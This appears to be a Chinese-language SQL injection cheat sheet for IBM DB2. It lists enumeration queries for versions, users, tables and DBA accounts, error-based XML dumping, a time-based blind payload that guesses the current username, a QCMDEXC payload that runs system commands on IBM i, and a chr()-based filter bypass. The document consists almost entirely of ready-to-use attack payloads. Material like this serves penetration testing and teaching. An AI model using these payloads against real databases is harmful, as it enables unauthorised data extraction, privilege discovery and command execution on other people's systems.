# DB2 注入

> IBM DB2 是由 IBM 开发的关系数据库管理系统（RDBMS）家族。最初于 1980 年代为大型机创建，DB2 已发展为支持各种平台和工作负载，包括分布式系统、云环境和混合部署。

## 概要

* [DB2 注释](#db2-注释)
* [DB2 默认数据库](#db2-默认数据库)
* [DB2 枚举](#db2-枚举)
* [DB2 方法论](#db2-方法论)
* [DB2 基于错误的注入](#db2-基于错误的注入)
* [DB2 基于盲注的注入](#db2-基于盲注的注入)
* [DB2 基于时间的注入](#db2-基于时间的注入)
* [DB2 命令执行](#db2-命令执行)
* [DB2 WAF 绕过](#db2-waf绕过)
* [DB2 账户与权限](#db2-账户与权限)
* [参考文献](#参考文献)

## DB2 注释

| 类型                       | 描述                       |
| -------------------------- | ------------------------- |
| `--`                       | SQL 注释                   |

## DB2 默认数据库

| 名称        | 描述                                                           |
| ----------- | ------------------------------------------------------------- |
| SYSIBM      | 存储数据库对象元数据的核心系统目录表。                           |
| SYSCAT      | 访问 SYSIBM 表中元数据的用户友好视图。                            |
| SYSSTAT     | DB2 优化器用于查询优化的统计表。                                  |
| SYSPUBLIC   | 所有用户可用的对象的元数据（授予 PUBLIC）。                      |
| SYSIBMADM   | 监控和管理数据库系统的管理视图。                                 |
| SYSTOOLS    | 提供的工具、实用程序和辅助对象，用于数据库管理和故障排除。         |

## DB2 枚举

| 描述           | SQL 查询                                              |
| --------------- | ---------------------------------------------------- |
| 数据库版本      | `select versionnumber, version_timestamp from sysibm.sysversions;` |
| 数据库版本      | `select service_level from table(sysproc.env_get_inst_info()) as instanceinfo` |
| 数据库版本      | `select getvariable('sysibm.version') from sysibm.sysdummy1` |
| 数据库版本      | `select prod_release,installed_prod_fullname from table(sysproc.env_get_prod_info()) as productinfo` |
| 数据库版本      | `select service_level,bld_level from sysibmadm.env_inst_info` |
| 当前用户       | `select user from sysibm.sysdummy1`                  |
| 当前用户       | `select session_user from sysibm.sysdummy1`          |
| 当前用户       | `select system_user from sysibm.sysdummy1`           |
| 当前数据库     | `select current server from sysibm.sysdummy1`        |
| OS 信息        | `select os_name,os_version,os_release,host_name from sysibmadm.env_sys_info` |

## DB2 方法论

| 描述           | SQL 查询                                              |
| --------------- | ---------------------------------------------------- |
| 列出数据库     | `SELECT distinct(table_catalog) FROM sysibm.tables`  |
| 列出数据库     | `SELECT schemaname FROM syscat.schemata;`            |
| 列出列         | `SELECT name, tbname, coltype FROM sysibm.syscolumns`|
| 列出表         | `SELECT table_name FROM sysibm.tables`              |
| 列出表         | `SELECT name FROM sysibm.systables`                 |
| 列出表         | `SELECT tbname FROM sysibm.syscolumns WHERE name='username'` |

## DB2 基于错误的注入

```sql
-- 返回所有以一个 XML 格式字符串的形式
select xmlagg(xmlrow(table_schema)) from sysibm.tables

-- 同上，但没有重复元素
select xmlagg(xmlrow(table_schema)) from (select distinct(table_schema) from sysibm.tables)

-- 返回所有以一个 XML 格式字符串。
-- 可能需要 CAST(xml2clob(… AS varchar(500)) 来显示结果。
select xml2clob(xmelement(name t, table_schema)) from sysibm.tables 
```

## DB2 基于盲注的注入

| 描述           | SQL 查询                                              |
| --------------- | ---------------------------------------------------- |
| 子字符串       | `select substr('abc',2,1) FROM sysibm.sysdummy1`     |
| ASCII 值       | `select chr(65) from sysibm.sysdummy1`               |
| CHAR 转 ASCII  | `select ascii('A') from sysibm.sysdummy1`            |
| 第 N 行选择     | `select name from (select * from sysibm.systables order by name asc fetch first N rows only) order by name desc fetch first row only` |
| 按位与         | `select bitand(1,0) from sysibm.sysdummy1`           |
| 按位与非       | `select bitandnot(1,0) from sysibm.sysdummy1`        |
| 按位或         | `select bitor(1,0) from sysibm.sysdummy1`            |
| 按位异或       | `select bitxor(1,0) from sysibm.sysdummy1`           |
| 按位取反       | `select bitnot(1,0) from sysibm.sysdummy1`           |

## DB2 基于时间的注入

如果用户以 ASCII 68 ('D') 开头，执行重量级查询，延迟响应。

```sql
' and (SELECT count(*) from sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)>0 and (select ascii(substr(user,1,1)) from sysibm.sysdummy1)=68 
```

## DB2 命令执行

> 可以使用 QSYS2.QCMDEXC() 过程和标量函数在 IBM i（以前称为 AS-400）上执行 IBM i CL 命令。

在 IBM i（以前称为 AS-400）上使用 `QSYS2.QCMDEXC()`，可以实现命令执行。

```sql
'||QCMDEXC('QSH CMD(''system dspusrprf PROFILE'')')
```

## DB2 WAF 绕过

### 避免引号

```sql
SELECT chr(65)||chr(68)||chr(82)||chr(73) FROM sysibm.sysdummy1
```

## DB2 账户与权限

| 描述           | SQL 查询                                              |
| --------------- | ---------------------------------------------------- |
| 列出用户       | `select distinct(grantee) from sysibm.systabauth`    |
| 列出用户       | `select distinct(definer) from syscat.schemata`      |
| 列出用户       | `select distinct(authid) from sysibmadm.privileges`  |
| 列出用户       | `select grantee from syscat.dbauth`                  |
| 列出权限       | `select * from syscat.tabauth`                       |
| 列出权限       | `select * from SYSIBM.SYSUSERAUTH — 列出 db2 系统权限` |
| 列出 DBA 账户  | `select distinct(grantee) from sysibm.systabauth where CONTROLAUTH='Y'` |
| 列出 DBA 账户  | `select name from SYSIBM.SYSUSERAUTH where SYSADMAUTH = 'Y' or SYSADMAUTH = 'G'` |
| 数据库文件位置  | `select * from sysibmadm.reg_variables where reg_var_name='DB2PATH'` |

## 参考文献

* [DB2 SQL 注入速查表 - Adrián - 2012年5月20日](https://securityetalii.es/2012/05/20/db2-sql-injection-cheat-sheet/)
* [Pentestmonkey 的 DB2 SQL 注入速查表 - @pentestmonkey - 2011年9月17日](http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet)
* [QSYS2.QCMDEXC() - IBM 支持 - 2023年4月22日](https://www.ibm.com/support/pages/qsys2qcmdexc)